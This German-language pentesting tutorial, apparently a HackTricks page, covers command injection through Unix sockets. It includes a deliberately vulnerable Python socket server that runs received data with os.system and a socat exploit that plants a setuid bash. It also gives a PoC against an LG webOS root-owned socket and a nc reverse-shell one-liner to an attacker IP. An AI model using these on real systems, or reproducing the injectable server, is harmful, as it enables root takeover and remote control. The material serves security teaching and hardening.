# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Beispiel für eine Socket-Bindung mit Python

Im folgenden Beispiel wird ein **Unix-Socket erstellt** (`/tmp/socket_test.s`), und alles, was **empfangen** wird, soll von `os.system` **ausgeführt** werden. Ich weiß, dass du so etwas nicht in freier Wildbahn finden wirst. Das Ziel dieses Beispiels ist jedoch zu zeigen, wie Code aussieht, der Unix-Sockets verwendet, und wie Eingaben im schlimmstmöglichen Fall verarbeitet werden.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Führe** den Code mit `python s.py` aus und **überprüfe, wie der Socket lauscht**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Fallstudie: Durch Signale ausgelöste Eskalation über einen Root-owned UNIX-Socket (LG webOS)

Einige privilegierte Daemons stellen einen Root-owned UNIX-Socket bereit, der nicht vertrauenswürdige Eingaben akzeptiert und privilegierte Aktionen an Thread-IDs und Signale koppelt. Wenn das Protokoll es einem unprivilegierten Client ermöglicht, zu beeinflussen, welcher native Thread angesprochen wird, kann möglicherweise ein privilegierter Codepfad ausgelöst und eine Rechteausweitung durchgeführt werden.

Beobachtetes Muster:
- Mit einem Root-owned Socket verbinden (z. B. /tmp/remotelogger).
- Einen Thread erstellen und seine native Thread-ID (TID) ermitteln.
- Die TID (gepackt) zusammen mit Padding als Anfrage senden; eine Bestätigung empfangen.
- Ein bestimmtes Signal an diese TID senden, um das privilegierte Verhalten auszulösen.

Minimales PoC-Schema:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Um daraus eine root shell zu machen, kann ein einfaches named-pipe + nc-Muster verwendet werden:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Notizen:
- Diese Klasse von Bugs entsteht durch das Vertrauen in Werte, die aus dem nicht privilegierten Client-Zustand (TIDs) abgeleitet und an privilegierte Signal-Handler oder Logik gebunden werden.
- Härtung durch das Durchsetzen von Credentials auf dem Socket, die Validierung von Nachrichtenformaten und die Entkopplung privilegierter Operationen von extern bereitgestellten Thread-IDs.

## Referenzen

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
